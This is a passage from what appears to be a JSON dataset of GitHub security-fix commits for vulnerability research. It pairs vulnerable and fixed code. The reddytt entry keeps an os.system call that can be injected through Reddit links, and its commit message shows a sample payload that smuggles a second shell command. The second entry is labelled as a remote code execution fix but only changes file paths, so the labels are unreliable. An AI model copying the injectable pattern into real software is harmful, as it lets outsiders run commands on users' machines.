You made a hard exit, and want to stop. (Ctrl+C)\n                 # Store the links and exit the program.\n                 print(\"Reddytt: Forced exit detected. Saving and exiting.\")\n", "message": "", "files": {"/reddytt.py": {"changes": [{"diff": "\n \n     subreddit = args.subreddit\n     depth = args.depth\n-    mpv = \" \".join(args.mpv)\n \n     subreddit_link = \"https://reddit.com/r/\" + subreddit\n \n", "add": 0, "remove": 1, "filename": "/reddytt.py", "badparts": ["    mpv = \" \".join(args.mpv)"], "goodparts": []}, {"diff": "\n         if link in seen_links:\n             print(\"Reddytt: Link seen. Skipping.\")\n         else:\n-            x = os.system(\"mpv %(args)s %(link)s\" % {\"link\": link, \"args\": mpv})\n+            p = subprocess.Popen(['mpv', link] + args.mpv, shell=False)\n+            p.communicate()\n             print(\"Reddytt: That was: %s\" % link)\n-            if x == 0:\n+            if p.returncode == 0:\n                 # The video finished or you hit 'q' (or whatever your binding is), this is a good exit.\n                 # Store the video in seen_links.\n                 seen_links.append(link)\n                 save_links.remove(link)\n-            elif x == 1024:\n+            elif p.returncode == 4:\n                 # You made a hard exit, and want to stop. (Ctrl+C)\n                 # Store the links and exit the program.\n                 print(\"Reddytt: Forced exit detected. Saving and exiting.\")\n", "add": 4, "remove": 3, "filename": "/reddytt.py", "badparts": ["            x = os.system(\"mpv %(args)s %(link)s\" % {\"link\": link, \"args\": mpv})", "            if x == 0:", "            elif x == 1024:"], "goodparts": ["            p = subprocess.Popen(['mpv', link] + args.mpv, shell=False)", "            p.communicate()", "            if p.returncode == 0:", "            elif p.returncode == 4:"]}], "source": "\n import os import pickle from bs4 import BeautifulSoup import urllib3 import certifi import re import sys import argparse as ap flatten=lambda l:[item for sublist in l for item in sublist] def getytlinks(link): pm=urllib3.PoolManager(cert_reqs='CERT_REQUIRED',ca_certs=certifi.where()) html_page=pm.request('GET', link) soup=BeautifulSoup(html_page.data, \"lxml\") links=[a.get('href') for a in soup('a') if a.get('href')] new_links=[x for x in links if re.match(\"^https://youtu\\.be\", x)] newer_links=[x for x in links if re.match(\"^https://www\\.youtube\\.com/watch\", x)] for lk in newer_links: videolabel=re.search('v=([^&?]*)', lk)[1] if videolabel is None: print('Reddytt: skipping URL without video label:', lk) continue new_links.append('https://www.youtube.com/watch?v=' +videolabel) return new_links, links if __name__=='__main__': parser=ap.ArgumentParser(usage='%(prog)s[options] <subreddit>[--[mpv-arguments]]', description='Play the youtube links from your favourite subreddit.') parser.add_argument('--depth', metavar='d', type=int, default=0, help='How many pages into the subreddit you want to go.') parser.add_argument('subreddit', type=str, help='The subreddit you want to play.') parser.add_argument('mpv', nargs=ap.REMAINDER, help='Arguments to pass to `mpv`.') args=parser.parse_args() subreddit=args.subreddit depth=args.depth mpv=\" \".join(args.mpv) subreddit_link=\"https://reddit.com/r/\" +subreddit work_dir=os.environ['HOME'] +\"/.reddytt\" sr_dir=work_dir +\"/%s\" % subreddit seen_file=sr_dir +\"/seen\" seen_links=[] unseen_file=sr_dir +\"/unseen\" unseen_links=[] print(\"Reddytt: Checking for reddytt working directory(%s).\" % work_dir) if not os.path.isdir(work_dir): print(\"Reddytt: Working directory not found. Creating %s, and files.\" % work_dir) os.mkdir(work_dir) os.mkdir(sr_dir) os.system(\"touch %s\" % seen_file) with open(seen_file, 'wb') as f: pickle.dump(seen_links, f) os.system(\"touch %s\" % unseen_file) with open(unseen_file, 'wb') as f: pickle.dump(unseen_links, f) elif not os.path.isdir(sr_dir): print(\"Reddytt: Working directory found, but no subreddit directory. Creating %s, and files.\" % sr_dir) os.mkdir(sr_dir) os.system(\"touch %s\" % seen_file) with open(seen_file, 'wb') as f: pickle.dump(seen_links, f) os.system(\"touch %s\" % unseen_file) with open(unseen_file, 'wb') as f: pickle.dump(unseen_links, f) else: print(\"Reddytt: Working directory found. Loading variables.\") with open(seen_file, 'rb') as f: seen_links=pickle.load(f) with open(unseen_file, 'rb') as f: unseen_links=pickle.load(f) new_links, links=getytlinks(subreddit_link) if depth > 0: for d in range(depth): link=\"\" for l in links: if re.search(\"after=\", l): link=l if link==\"\": print(\"Reddytt: Could not identify 'after'-variable to progress deeper.\") else: newer_links, links=getytlinks(link) new_links +=newer_links new_links=list(set(new_links)) new_links +=unseen_links new_links=list(set(new_links)) save_links=new_links for link in new_links: if link in seen_links: print(\"Reddytt: Link seen. Skipping.\") else: x=os.system(\"mpv %(args)s %(link)s\" %{\"link\": link, \"args\": mpv}) print(\"Reddytt: That was: %s\" % link) if x==0: seen_links.append(link) save_links.remove(link) elif x==1024: print(\"Reddytt: Forced exit detected. Saving and exiting.\") with open(seen_file, 'wb') as f: pickle.dump(seen_links, f) with open(unseen_file, 'wb') as f: pickle.dump(save_links, f) sys.exit() else: seen_links.append(link) save_links.remove(link) with open(seen_file, 'wb') as f: pickle.dump(seen_links, f) with open(unseen_file, 'wb') as f: pickle.dump(save_links, f) ", "sourceWithComments": "#!/usr/bin/env python3\n\n################\n# Imports\n################\n\nimport os\nimport pickle\nfrom bs4 import BeautifulSoup\nimport urllib3\nimport certifi\nimport re\nimport sys\nimport argparse as ap\n#from argparse import ArgumentParser, REMINDER\n\n################\n# Functions\n################\n\n# Function to flatten a list\nflatten = lambda l: [item for sublist in l for item in sublist]\n# cheers to https://stackoverflow.com/a/952952\n\n# Get and parse out links\ndef getytlinks(link):\n    pm = urllib3.PoolManager(cert_reqs='CERT_REQUIRED',ca_certs=certifi.where())\n    html_page = pm.request('GET', link)\n    soup = BeautifulSoup(html_page.data, \"lxml\")\n    links = [a.get('href') for a in soup('a') if a.get('href')]\n\n    # Pick out youtube links\n    new_links = [x for x in links if re.match(\"^https://youtu\\.be\", x)]\n    newer_links = [x for x in links if re.match(\"^https://www\\.youtube\\.com/watch\", x)]\n    # the youtube.com links are not always well formatted for mpv, so we reformat them:\n    for lk in newer_links:\n        videolabel = re.search('v=([^&?]*)', lk)[1]\n        if videolabel is None:\n            print('Reddytt: skipping URL without video label:', lk)\n            continue\n        new_links.append('https://www.youtube.com/watch?v=' + videolabel)\n    # in principal, add anything here you want. I guess all of these should work: https://rg3.github.io/youtube-dl/supportedsites.html\n    return new_links, links\n\n################\n# Main\n################\n\nif __name__ == '__main__':\n\n    parser = ap.ArgumentParser(usage='%(prog)s [options] <subreddit> [-- [mpv-arguments]]', description='Play the youtube links from your favourite subreddit.')\n\n    parser.add_argument('--depth', metavar='d', type=int, default=0, help='How many pages into the subreddit you want to go.')\n    parser.add_argument('subreddit', type=str, help='The subreddit you want to play.')\n    parser.add_argument('mpv', nargs=ap.REMAINDER, help='Arguments to pass to `mpv`.')\n\n    args = parser.parse_args()\n\n    subreddit = args.subreddit\n    depth = args.depth\n    mpv = \" \".join(args.mpv)\n\n    subreddit_link = \"https://reddit.com/r/\" + subreddit\n\n    # Setup working directory\n    work_dir = os.environ['HOME'] + \"/.reddytt\"\n    sr_dir = work_dir + \"/%s\" % subreddit\n    seen_file = sr_dir + \"/seen\"\n    seen_links = []\n    unseen_file = sr_dir + \"/unseen\"\n    unseen_links = []\n    print(\"Reddytt: Checking for reddytt working directory (%s).\" % work_dir)\n\n    if not os.path.isdir(work_dir):\n        print(\"Reddytt: Working directory not found. Creating %s, and files.\" % work_dir)\n        os.mkdir(work_dir)\n        os.mkdir(sr_dir)\n        os.system(\"touch %s\" % seen_file)\n        with open(seen_file, 'wb') as f:\n            pickle.dump(seen_links, f)\n        os.system(\"touch %s\" % unseen_file)\n        with open(unseen_file, 'wb') as f:\n            pickle.dump(unseen_links, f)\n    elif not os.path.isdir(sr_dir):\n        print(\"Reddytt: Working directory found, but no subreddit directory. Creating %s, and files.\" % sr_dir)\n        os.mkdir(sr_dir)\n        os.system(\"touch %s\" % seen_file)\n        with open(seen_file, 'wb') as f:\n            pickle.dump(seen_links, f)\n        os.system(\"touch %s\" % unseen_file)\n        with open(unseen_file, 'wb') as f:\n            pickle.dump(unseen_links, f)\n    else:\n        print(\"Reddytt: Working directory found. Loading variables.\")\n        with open(seen_file, 'rb') as f:\n            seen_links = pickle.load(f)\n        with open(unseen_file, 'rb') as f:\n            unseen_links = pickle.load(f)\n\n    new_links, links = getytlinks(subreddit_link)\n\n    # Go deeper\n    if depth > 0:\n        for d in range(depth):\n            link = \"\"\n            for l in links:\n                if re.search(\"after=\", l):\n                    link = l\n            if link == \"\":\n                print(\"Reddytt: Could not identify 'after'-variable to progress deeper.\")\n            else:\n                newer_links, links = getytlinks(link)\n                new_links += newer_links\n                new_links = list(set(new_links))\n\n    # we also want to watch the stored ones\n    new_links += unseen_links\n    new_links = list(set(new_links))\n\n    # Start watching\n    save_links = new_links\n    for link in new_links:\n        if link in seen_links:\n            print(\"Reddytt: Link seen. Skipping.\")\n        else:\n            x = os.system(\"mpv %(args)s %(link)s\" % {\"link\": link, \"args\": mpv})\n            print(\"Reddytt: That was: %s\" % link)\n            if x == 0:\n                # The video finished or you hit 'q' (or whatever your binding is), this is a good exit.\n                # Store the video in seen_links.\n                seen_links.append(link)\n                save_links.remove(link)\n            elif x == 1024:\n                # You made a hard exit, and want to stop. (Ctrl+C)\n                # Store the links and exit the program.\n                print(\"Reddytt: Forced exit detected. Saving and exiting.\")\n                with open(seen_file, 'wb') as f:\n                    pickle.dump(seen_links, f)\n                with open(unseen_file, 'wb') as f:\n                    pickle.dump(save_links, f)\n                # Exit program.\n                sys.exit()\n            else:\n                # Something else happened. Bad link perhaps.\n                # Store in seen_links to avoid in the future.\n\n                seen_links.append(link)\n                save_links.remove(link)\n\n    # The playlist is finished. Save everything.\n    with open(seen_file, 'wb') as f:\n        pickle.dump(seen_links, f)\n    with open(unseen_file, 'wb') as f:\n        pickle.dump(save_links, f)\n"}}, "msg": "Fix remote code execution.\n\nReddit controls the contents of `link` in:\n\n    os.system(\"mpv %(args)s %(link)s\" % {\"link\": link, \"args\": mpv})\n\nso arbitrary remote code can be executed under the user running\n`reddytt.sh`. Example:\n\n    <a href='https://youtu.be/VwCaOg39ZCo; touch $HOME/pwned') </a>\n\nFixes issue: (https://github.com/johanbluecreek/reddytt/issues/5"}}, "https://github.com/EKami/deep_learning_A-Z": {"c5bcd4582baf5e9e2e8460a0b0c3deb306f2a30f": {"url": "https://api.github.com/repos/EKami/deep_learning_A-Z/commits/c5bcd4582baf5e9e2e8460a0b0c3deb306f2a30f", "html_url": "https://github.com/EKami/deep_learning_A-Z/commit/c5bcd4582baf5e9e2e8460a0b0c3deb306f2a30f", "message": "Fix file not found for remote code execution", "sha": "c5bcd4582baf5e9e2e8460a0b0c3deb306f2a30f", "keyword": "remote code execution fix", "diff": "diff --git a/Get_the_machine_learning_basics/Classification_Template/classification_template.py b/Get_the_machine_learning_basics/Classification_Template/classification_template.py\nindex 9465464..9d73f0e 100644\n--- a/Get_the_machine_learning_basics/Classification_Template/classification_template.py\n+++ b/Get_the_machine_learning_basics/Classification_Template/classification_template.py\n@@ -2,11 +2,17 @@\n \n # Importing the libraries\n import numpy as np\n+import matplotlib\n+matplotlib.use(\"tkAgg\")\n import matplotlib.pyplot as plt\n import pandas as pd\n+import os\n+\n+script_dir = os.path.dirname(__file__)\n+abs_file_path = os.path.join(script_dir, 'Social_Network_Ads.csv')\n \n # Importing the dataset\n-dataset = pd.read_csv('Social_Network_Ads.csv')\n+dataset = pd.read_csv(abs_file_path)\n X = dataset.iloc[:, [2, 3]].values\n y = dataset.iloc[:, 4].values\n \n@@ -23,6 +29,10 @@\n \n # Fitting classifier to the Training set\n # Create your classifier here\n+from sklearn.linear_model import LogisticRegression\n+\n+classifier = LogisticRegression()\n+classifier.fit(X_train, y_train)\n \n # Predicting the Test set results\n y_pred = classifier.predict(X_test)\ndiff --git a/Get_the_machine_learning_basics/Data_Preprocessing_Template/data_preprocessing_template.py b/Get_the_machine_learning_basics/Data_Preprocessing_Template/data_preprocessing_template.py\nindex a357a1d..f131002 100644\n--- a/Get_the_machine_learning_basics/Data_Preprocessing_Template/data_preprocessing_template.py\n+++ b/Get_the_machine_learning_basics/Data_Preprocessing_Template/data_preprocessing_template.py\n@@ -4,8 +4,12 @@\n import numpy as np\n import matplotlib.pyplot as plt\n import pandas as pd\n+import os\n+\n+script_dir = os.path.dirname(__file__)\n+abs_file_path = os.path.join(script_dir, 'Data.csv')\n \n # Importing the dataset\n-dataset = pd.read_csv('Data.csv')\n+dataset = pd.read_csv(abs_file_path)\n X = dataset.iloc[:, :-1].values\n y = dataset.iloc[:, -1].values\n\\ No newline at end of file\ndiff --git a/Volume_1-Supervised_Deep_Learning/Part_1-Artificial_Neural_Networks-ANN/Section_4-Building_an_ANN/ann.py b/Volume_1-Supervised_Deep_Learning/Part_1-Artificial_Neural_Networks-ANN/Section_4-Building_an_ANN/ann.py\nindex a8a3d54..b7f6b24 100644\n--- a/Volume_1-Supervised_Deep_Learning/Part_1-Artificial_Neural_Networks-ANN/Section_4-Building_an_ANN/ann.py\n+++ b/Volume_1-Supervised_Deep_Learning/Part_1-Artificial_Neural_Networks-ANN/Section_4-Building_an_ANN/ann.py\n@@ -15,9 +15,13 @@\n import numpy as np\n import matplotlib.pyplot as plt\n import pandas as pd\n+import os\n+\n+script_dir = os.path.dirname(__file__)\n+abs_file_path = os.path.join(script_dir, 'Churn_Modelling.csv')\n \n # Importing the dataset\n-dataset = pd.read_csv('Churn_Modelling.csv')\n+dataset = pd.read_csv(abs_file_path)\n X = dataset.iloc[:, 3:13].values\n y = dataset.iloc[:, 13].values\n \n@@ -27,13 +31,13 @@\n X[:, 1] = labelencoder_X_1.fit_transform(X[:, 1])\n labelencoder_X_2 = LabelEncoder()\n X[:, 2] = labelencoder_X_2.fit_transform(X[:, 2])\n-onehotencoder = OneHotEncoder(categorical_features = [1])\n+onehotencoder = OneHotEncoder(categorical_features=[1])\n X = onehotencoder.fit_transform(X).toarray()\n X = X[:, 1:]\n \n # Splitting the dataset into the Training set and Test set\n from sklearn.model_selection import train_test_split\n-X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.2, random_state = 0)\n+X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=0)\n \n # Feature Scaling\n from sklearn.preprocessing import StandardScaler\n@@ -52,19 +56,19 @@\n classifier = Sequential()\n \n # Adding the input layer and the first hidden layer\n-classifier.add(Dense(units = 6, kernel_initializer = 'uniform', activation = 'relu', input_dim = 11))\n+classifier.add(Dense(units=6, kernel_initializer='uniform', activation='relu', input_dim=11))\n \n # Adding the second hidden layer\n-classifier.add(Dense(units = 6, kernel_initializer = 'uniform', activation = 'relu'))\n+classifier.add(Dense(units=6, kernel_initializer='uniform', activation='relu'))\n \n # Adding the output layer\n-classifier.add(Dense(units = 1, kernel_initializer = 'uniform', activation = 'sigmoid'))\n+classifier.add(Dense(units=1, kernel_initializer='uniform', activation='sigmoid'))\n \n # Compiling the ANN\n-classifier.compile(optimizer = 'adam', loss = 'binary_crossentropy', metrics = ['accuracy'])\n+classifier.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])\n \n # Fitting the ANN to the Training set\n-classifier.fit(X_train, y_train, batch_size = 10, epochs = 100)\n+classifier.fit(X_train, y_train, batch_size=10, epochs=100)\n \n # Part 3 - Making predictions and evaluating the model\n \n", "files": {"/Get_the_machine_learning_basics/Classification_Template/classification_template.py": {"changes": [{"diff": "\n \n # Importing the libraries\n import numpy as np\n+import matplotlib\n+matplotlib.use(\"tkAgg\")\n import matplotlib.pyplot as plt\n import pandas as pd\n+import os\n+\n+script_dir = os.path.dirname(__file__)\n+abs_file_path = os.path.join(script_dir, 'Social_Network_Ads.csv')\n \n # Importing the dataset\n-dataset = pd.read_csv('Social_Network_Ads.csv')\n+dataset = pd.read_csv(abs_file_path)\n X = dataset.iloc[:, [2, 3]].values\n y = dataset.iloc[:, 4].values\n \n", "add": 7, "remove": 1, "filename": "/Get_the_machine_learning_basics/Classification_Template/classification_template.py", "badparts": ["dataset = pd.read_csv('Social_Network_Ads.csv')"], "goodparts": ["import matplotlib", "matplotlib.use(\"tkAgg\")", "script_dir = os.path.dirname(__file__)", "abs_file_path = os.path.join(script_dir, 'Social_Network_Ads.csv')", "dataset = pd.read_csv(abs_file_path)"]}], "source": "\n import numpy as np import matplotlib.pyplot as plt import pandas as pd dataset=pd.read_csv('Social_Network_Ads.csv') X=dataset.iloc[:,[2, 3]].values y=dataset.iloc[:, 4].values from sklearn.model_selection import train_test_split X_train, X_test, y_train, y_test=train_test_split(X, y, test_size=0.25, random_state=0) from sklearn.preprocessing import StandardScaler sc=StandardScaler() X_train=sc.fit_transform(X_train) X_test=sc.transform(X_test) y_pred=classifier.predict(X_test) from sklearn.metrics import confusion_matrix cm=confusion_matrix(y_test, y_pred) from matplotlib.colors import ListedColormap X_set, y_set=X_train, y_train X1, X2=np.meshgrid(np.arange(start=X_set[:, 0].min() -1, stop=X_set[:, 0].max() +1, step=0.01), np.arange(start=X_set[:, 1].min() -1, stop=X_set[:, 1].max() +1, step=0.01)) plt.contourf(X1, X2, classifier.predict(np.array([X1.ravel(), X2.ravel()]).T).reshape(X1.shape), alpha=0.75, cmap=ListedColormap(('red', 'green'))) plt.xlim(X1.min(), X1.max()) plt.ylim(X2.min(), X2.max()) for i, j in enumerate(np.unique(y_set)): plt.scatter(X_set[y_set==j, 0], X_set[y_set==j, 1], c=ListedColormap(('red', 'green'))(i), label=j) plt.title('Classifier(Training set)') plt.xlabel('Age') plt.ylabel('Estimated Salary') plt.legend() plt.show() from matplotlib.colors import ListedColormap X_set, y_set=X_test, y_test X1, X2=np.meshgrid(np.arange(start=X_set[:, 0].min() -1, stop=X_set[:, 0].max() +1, step=0.01), np.arange(start=X_set[:, 1].min() -1, stop=X_set[:, 1].max() +1, step=0.01)) plt.contourf(X1, X2, classifier.predict(np.array([X1.ravel(), X2.ravel()]).T).reshape(X1.shape), alpha=0.75, cmap=ListedColormap(('red', 'green'))) plt.xlim(X1.min(), X1.max()) plt.ylim(X2.min(), X2.max()) for i, j in enumerate(np.unique(y_set)): plt.scatter(X_set[y_set==j, 0], X_set[y_set==j, 1], c=ListedColormap(('red', 'green'))(i), label=j) plt.title('Classifier(Test set)') plt.xlabel('Age') plt.ylabel('Estimated Salary') plt.legend() plt.show() ", "sourceWithComments": "# Classification template\n\n# Importing the libraries\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport pandas as pd\n\n# Importing the dataset\ndataset = pd.read_csv('Social_Network_Ads.csv')\nX = dataset.iloc[:, [2, 3]].values\ny = dataset.iloc[:, 4].values\n\n# Splitting the dataset into the Training set and Test set\nfrom sklearn.model_selection import train_test_split\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.25, random_state=0)\n\n# Feature Scaling\nfrom sklearn.preprocessing import StandardScaler\n\nsc = StandardScaler()\nX_train = sc.fit_transform(X_train)\nX_test = sc.transform(X_test)\n\n# Fitting classifier to the Training set\n# Create your classifier here\n\n# Predicting the Test set results\ny_pred = classifier.predict(X_test)\n\n# Making the Confusion Matrix\nfrom sklearn.metrics import confusion_matrix\ncm = confusion_matrix(y_test, y_pred)\n\n# Visualising the Training set results\nfrom matplotlib.colors import ListedColormap\nX_set, y_set = X_train, y_train\nX1, X2 = np.meshgrid(np.arange(start=X_set[:, 0].min() - 1, stop=X_set[:, 0].max() + 1, step=0.01),\n                     np.arange(start=X_set[:, 1].min() - 1, stop=X_set[:, 1].max() + 1, step=0.01))\nplt.contourf(X1, X2, classifier.predict(np.array([X1.ravel(), X2.ravel()]).T).reshape(X1.shape),\n             alpha=0.75, cmap=ListedColormap(('red', 'green')))\nplt.xlim(X1.min(), X1.max())\nplt.ylim(X2.min(), X2.max())\nfor i, j in enumerate(np.unique(y_set)):\n    plt.scatter(X_set[y_set == j, 0], X_set[y_set == j, 1],\n                c = ListedColormap(('red', 'green'))(i), label = j)\nplt.title('Classifier (Training set)')\nplt.xlabel('Age')\nplt.ylabel('Estimated Salary')\nplt.legend()\nplt.show()\n\n# Visualising the Test set results\nfrom matplotlib.colors import ListedColormap\n\nX_set, y_set = X_test, y_test\nX1, X2 = np.meshgrid(np.arange(start=X_set[:, 0].min() - 1, stop=X_set[:, 0].max() + 1, step=0.01),\n                     np.arange(start=X_set[:, 1].min() - 1, stop=X_set[:, 1].max() + 1, step=0.01))\nplt.contourf(X1, X2, classifier.predict(np.array([X1.ravel(), X2.ravel()]).T).reshape(X1.shape),\n             alpha=0.75, cmap=ListedColormap(('red', 'green')))\nplt.xlim(X1.min(), X1.max())\nplt.ylim(X2.min(), X2.max())\nfor i, j in enumerate(np.unique(y_set)):\n    plt.scatter(X_set[y_set == j, 0], X_set[y_set == j, 1],\n                c=ListedColormap(('red', 'green'))(i), label=j)\nplt.title('Classifier (Test set)')\nplt.xlabel('Age')\nplt.ylabel('Estimated Salary')\nplt.legend()\nplt.show()"}, "/Get_the_machine_learning_basics/Data_Preprocessing_Template/data_preprocessing_template.py": {"changes": [{"diff": "\n import numpy as np\n import matplotlib.pyplot as plt\n import pandas as pd\n+import os\n+\n+script_dir = os.path.dirname(__file__)\n+abs_file_path = os.path.join(script_dir, 'Data.csv')\n \n # Importing the dataset\n-dataset = pd.read_csv('Data.csv')\n+dataset = pd.read_csv(abs_file_path)\n X = dataset.iloc[:, :-1].values\n y = dataset.iloc[:, -1].values\n\\ No newline at end of fil", "add": 5, "remove": 1, "filename": "/Get_the_machine_learning_basics/Data_Preprocessing_Template/data_preprocessing_template.py", "badparts": ["dataset = pd.read_csv('Data.csv')"], "goodparts": ["script_dir = os.path.dirname(__file__)", "abs_file_path = os.path.join(script_dir, 'Data.csv')", "dataset = pd.read_csv(abs_file_path)"]}], "source": "\n import numpy as np import matplotlib.pyplot as plt import pandas as pd dataset=pd.read_csv('Data.csv') X=dataset.iloc[:,:-1].values y=dataset.iloc[:, -1].values ", "sourceWithComments": "# Data Preprocessing\n\n# Importing the libraries\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport pandas as pd\n\n# Importing the dataset\ndataset = pd.read_csv('Data.csv')\nX = dataset.iloc[:, :-1].values\ny = dataset.iloc[:, -1].values"}, "/Volume_1-Supervised_Deep_Learning/Part_1-Artificial_Neural_Networks-ANN/Section_4-Building_an_ANN/ann.py": {"changes": [{"diff": "\n import numpy as np\n import matplotlib.pyplot as plt\n import pandas as pd\n+import os\n+\n+script_dir = os.path.dirname(__file__)\n+abs_file_path = os.path.join(script_dir, 'Churn_Modelling.csv')\n \n # Importing the dataset\n-dataset = pd.read_csv('Churn_Modelling.csv')\n+dataset = pd.read_csv(abs_file_path)\n X = dataset.iloc[:, 3:13].values\n y = dataset.iloc[:, 13].values\n \n", "add": 5, "remove": 1, "filename": "/Volume_1-Supervised_Deep_Learning/Part_1-Artificial_Neural_Networks-ANN/Section_4-Building_an_ANN/ann.py", "badparts": ["dataset = pd.read_csv('Churn_Modelling.csv')"], "goodparts": ["script_dir = os.path.dirname(__file__)", "abs_file_path = os.path.join(script_dir, 'Churn_Modelling.csv')", "dataset = pd.read_csv(abs_file_path)"]}, {"diff": "\n labelencoder_X_2 = LabelEncoder()\n X[:, 2] = labelencoder_X_2.fit_transform(X[:, 2])\n-onehotencoder = OneHotEncoder(categorical_features = [1])\n+onehotencoder = OneHotEncoder(categorical_features=[1])\n X = onehotencoder.fit_transform(X).toarray()\n X = X[:, 1:]\n \n # Splitting the dataset into the Training set and Test set\n from sklearn.model_selection import train_test_split\n-X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.2, random_state = 0)\n+X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=0)\n \n # Feature Scaling\n from sklearn.preprocessing import StandardScaler\n", "add": 2, "remove": 2, "filename": "/Volume_1-Supervised_Deep_Learning/Part_1-Artificial_Neural_Networks-ANN/Section_4-Building_an_ANN/ann.py", "badparts": ["onehotencoder = OneHotEncoder(categorical_features = [1])", "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.2, random_state = 0)"], "goodparts": ["onehotencoder = OneHotEncoder(categorical_features=[1])", "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=0)"]}, {"diff": "\n \n # Adding the input layer and the first hidden layer\n-classifier.add(Dense(units = 6, kernel_initializer = 'uniform', activation = 'relu', input_dim = 11))\n+classifier.add(Dense(units=6, kernel_initializer='uniform', activation='relu', input_dim=11))\n \n # Adding the second hidden layer\n-classifier.add(Dense(units = 6, kernel_initializer = 'uniform', activation = 'relu'))\n+classifier.add(Dense(units=6, kernel_initializer='uniform', activation='relu'))\n \n # Adding the output layer\n-classifier.add(Dense(units = 1, kernel_initializer = 'uniform', activation = 'sigmoid'))\n+classifier.add(Dense(units=1, kernel_initializer='uniform', activation='sigmoid'))\n \n # Compiling the ANN\n-classifier.compile(optimizer = 'adam', loss = 'binary_crossentropy', metrics = ['accuracy'])\n+classifier.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])\n \n # Fitting the ANN to the Training set\n-classifier.fit(X_train, y_train, batch_size = 10, epochs = 100)\n+classifier.fit(X_train, y_train, batch_size=10, epochs=100)\n \n # Part 3 - Making predictions and evaluating the model\n \n", "add": 5, "remove": 5, "filename": "/Volume_1-Supervised_Deep_Learning/Part_1-Artificial_Neural_Networks-ANN/Section_4-Building_an_ANN/ann.py", "badparts": ["classifier.add(Dense(units = 6, kernel_initializer = 'uniform', activation = 'relu', input_dim = 11))", "classifier.add(Dense(units = 6, kernel_initializer = 'uniform', activation = 'relu'))", "classifier.add(Dense(units = 1, kernel_initializer = 'uniform', activation = 'sigmoid'))", "classifier.compile(optimizer = 'adam', loss = 'binary_crossentropy', metrics = ['accuracy'])", "classifier.fit(X_train, y_train, batch_size = 10, epochs = 100)"], "goodparts": ["classifier.add(Dense(units=6, kernel_initializer='uniform', activation='relu', input_dim=11))", "classifier.add(Dense(units=6, kernel_initializer='uniform', activation='relu'))", "classifier.add(Dense(units=1, kernel_initializer='uniform', activation='sigmoid'))", "classifier.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])", "classifier.fit(X_train, y_train, batch_size=10, epochs=100)"]}], "source": "\n import numpy as np import matplotlib.pyplot as plt import pandas as pd dataset=pd.read_csv('Churn_Modelling.csv') X=dataset.iloc[:, 3:13].values y=dataset.iloc[:, 13].values from sklearn.preprocessing import LabelEncoder, OneHotEncoder labelencoder_X_1=LabelEncoder() X[:, 1]=labelencoder_X_1.fit_transform(X[:, 1]) labelencoder_X_2=LabelEncoder() X[:, 2]=labelencoder_X_2.fit_transform(X[:, 2]) onehotencoder=OneHotEncoder(categorical_features=[1]) X=onehotencoder.fit_transform(X).toarray() X=X[:, 1:] from sklearn.model_selection import train_test_split X_train, X_test, y_train, y_test=train_test_split(X, y, test_size=0.2, random_state=0) from sklearn.preprocessing import StandardScaler sc=StandardScaler() X_train=sc.fit_transform(X_train) X_test=sc.transform(X_test) import keras from keras.models import Sequential from keras.layers import Dense classifier=Sequential() classifier.add(Dense(units=6, kernel_initializer='uniform', activation='relu', input_dim=11)) classifier.add(Dense(units=6, kernel_initializer='uniform', activation='relu')) classifier.add(Dense(units=1, kernel_initializer='uniform', activation='sigmoid')) classifier.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy']) classifier.fit(X_train, y_train, batch_size=10, epochs=100) y_pred=classifier.predict(X_test) y_pred=(y_pred > 0.5) from sklearn.metrics import confusion_matrix cm=confusion_matrix(y_test, y_pred) ", "sourceWithComments": "# Artificial Neural Network\n\n# Installing Theano\n# pip install --upgrade --no-deps git+git://github.com/Theano/Theano.git\n\n# Installing Tensorflow\n# pip install tensorflow\n\n# Installing Keras\n# pip install --upgrade keras\n\n# Part 1 - Data Preprocessing\n\n# Importing the libraries\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport pandas as pd\n\n# Importing the dataset\ndataset = pd.read_csv('Churn_Modelling.csv')\nX = dataset.iloc[:, 3:13].values\ny = dataset.iloc[:, 13].values\n\n# Encoding categorical data\nfrom sklearn.preprocessing import LabelEncoder, OneHotEncoder\nlabelencoder_X_1 = LabelEncoder()\nX[:, 1] = labelencoder_X_1.fit_transform(X[:, 1])\nlabelencoder_X_2 = LabelEncoder()\nX[:, 2] = labelencoder_X_2.fit_transform(X[:, 2])\nonehotencoder = OneHotEncoder(categorical_features = [1])\nX = onehotencoder.fit_transform(X).toarray()\nX = X[:, 1:]\n\n# Splitting the dataset into the Training set and Test set\nfrom sklearn.model_selection import train_test_split\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.2, random_state = 0)\n\n# Feature Scaling\nfrom sklearn.preprocessing import StandardScaler\nsc = StandardScaler()\nX_train = sc.fit_transform(X_train)\nX_test = sc.transform(X_test)\n\n# Part 2 - Now let's make the ANN!\n\n# Importing the Keras libraries and packages\nimport keras\nfrom keras.models import Sequential\nfrom keras.layers import Dense\n\n# Initialising the ANN\nclassifier = Sequential()\n\n# Adding the input layer and the first hidden layer\nclassifier.add(Dense(units = 6, kernel_initializer = 'uniform', activation = 'relu', input_dim = 11))\n\n# Adding the second hidden layer\nclassifier.add(Dense(units = 6, kernel_initializer = 'uniform', activation = 'relu'))\n\n# Adding the output layer\nclassifier.add(Dense(units = 1, kernel_initializer = 'uniform', activation = 'sigmoid'))\n\n# Compiling the ANN\nclassifier.compile(optimizer = 'adam', loss = 'binary_crossentropy', metrics = ['accuracy'])\n\n# Fitting the ANN to the Training set\nclassifier.fit(X_train, y_train, batch_size = 10, epochs = 100)\n\n# Part 3 - Making predictions and evaluating the model\n\n# Predicting the Test set results\ny_pred = classifier.predict(X_test)\ny_pred = (y_pred > 0.5)\n\n# Making the Confusion Matrix\nfrom sklearn.metrics import confusion_matrix\ncm = confusion_matrix(y_test, y_pred)"}}, "msg": "Fix file not found for remote code execution"}}, "https://github.com/Spredzy/agent2": 